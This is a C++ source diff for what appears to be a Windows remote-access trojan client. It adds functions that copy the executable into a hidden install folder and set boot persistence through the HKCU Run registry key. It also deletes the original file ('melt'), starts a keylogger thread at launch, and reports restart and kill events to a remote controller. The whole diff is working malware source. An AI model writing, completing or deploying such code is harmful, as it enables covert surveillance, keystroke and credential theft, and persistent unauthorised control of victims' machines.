@@ -11,10 +11,48 @@ LPTSTR General::lpArguments;
 
 bool General::init()	//startup of program
 {
-	return true;
+	//VARIABLE SETUP
+	currentPath = getCurrentPath();
+	installFolder = getInstallFolder();
+	installPath = getInstallPath(installFolder);
+
+
+
+	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
+	{
+		remove(lpArguments);
+	}
+
+	if (Settings::installSelf)
+	{
+		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
+		{
+			setLocation();
+			installing = true;
+		}
+	}
+
+	if (Settings::setStartupSelf)			//checks if it should set itself into startup
+	{
+		if (!startupSet())				//checks if it's startup is set
+		{
+			setStartup(Conversion::convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? Conversion::convStringToWidestring(installPath).c_str() : Conversion::convStringToWidestring(currentPath).c_str(), NULL);
+		}
+	}
+
+
+	runInstalled();			//checks if this run of the instance is designated to the install process, then checks whether it should start the installed client
+
+	if (Settings::logKeys)
+	{
+		std::thread Keylogger(Keylogger::startLogger);
+		Keylogger.detach();
+	}
+
+	return installing;
 }
 
-bool General::regValueExists(HKEY hKey, LPCWSTR keyPath, LPCWSTR valueName)
+bool General::regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName)
 {
 	DWORD dwType = 0;
 	long lResult = 0;
@@ -92,12 +130,35 @@ bool General::directoryExists(const char* dirName)			//checks if directory exist
 
 std::string General::getInstallFolder()		//gets install folder (example: C:\users\USER\AppData\Roaming\InstallDIR)
 {
+	std::string rest = "";
+	if (!(Settings::folderName == ""))
+		rest = "\\" + Settings::folderName;
+
+	std::string concat;
+	char* buf = 0;
+	size_t sz = 0;
+	if (_dupenv_s(&buf, &sz, Settings::installLocation.c_str()) == 0) //gets environment variable
+		if (buf != NULL)
+		{
+
+			concat = std::string(buf) + rest; //concatenates string
+			free(buf);
+		}
+	return concat;
+}
+
+std::string General::getInstallPath(std::string instFolder)		//gets installpath (environment folder + folder name (if supplied) + file name)
+{
+	std::string concat;
+	concat = instFolder + "\\" + Settings::fileName;
+
+	return concat;
 }
 
 std::string General::getCurrentPath()		//gets current path of executable
 {
 	char buf[MAX_PATH];
-	GetModuleFileNameA(0, buf, MAX_PATH);
+	GetModuleFileName(0, buf, MAX_PATH);
 	return std::string(buf);
 }
 
@@ -113,7 +174,16 @@ bool General::locationSet()		//checks if executable is located in install positi
 
 bool General::startupSet()		//checks if executable is starting on boot
 {
-	if (General::regValueExists(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", Conversion::convStringToLPTSTR(Settings::startupName)))
+	if (General::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
+		return true;
+	else
+		return false;
+}
+
+
+bool General::installed()		//checks if executable is installed properly (location + startup)
+{
+	if (startupSet() && locationSet())
 		return true;
 	else
 		return false;
@@ -183,6 +253,18 @@ void General::handleError(int errType, bool errSevere)	//handles errors
 
 }
 
+bool General::processParameter(std::string &command, std::string compCommand)
+{
+	std::string::size_type i = command.find(compCommand);
+	if (i != std::string::npos)
+	{
+		command.erase(i, compCommand.length() + 1);
+		return true;
+	}
+	else
+		return false;
+}
+
 std::string General::processCommand(std::string command)
 {
 	if (command == "kill")
@@ -243,17 +325,17 @@ std::string General::processCommand(std::string command)
 	}
 }
 
+void General::restartSelf()
+{
+	Client::clientptr->SendString("Restart requested: Restarting self", PacketType::Warning);
+	startProcess(currentPath.c_str(), NULL);
+	exit(0);
+}
+
 void General::killSelf()
 {
 	Client::clientptr->SendString("Termination requested: Killing self", PacketType::Warning);
 	Client::clientptr->CloseConnection();
-	exit(0);
-}
-
-void General::restartSelf()
-{
-	Client::clientptr->SendString("Restart requested: Restarting self", PacketType::Warning);
-	startProcess(Conversion::convStringToLPTSTR(currentPath), NULL);
 	exit(0);
 }
 
@@ -268,14 +350,24 @@ void General::log(std::string message)
 	}
 }
 
-bool General::processParameter(std::string& command, std::string compCommand)
+
+void General::setLocation()			//sets location(copies file)
 {
-	std::string::size_type i = command.find(compCommand);
-	if (i != std::string::npos)
-	{
-		command.erase(i, compCommand.length() + 1);
-		return true;
-	}
-	else
-		return false;
+	if (!General::directoryExists(General::installFolder.c_str()))
+		if (!CreateDirectory(General::installFolder.c_str(), NULL))	//tries to create folder		
+		{
+			//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
+		}
+	CopyFile(General::currentPath.c_str(), General::installPath.c_str(), 0);
+}
+
+
+void General::runInstalled()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
+{
+	if (General::installing)
+		if (!Settings::startOnNextBoot)
+		{
+			General::startProcess(General::installPath.c_str(), Settings::meltSelf ? Conversion::convStringToLPTSTR("t " + General::currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
+		}
+
 }
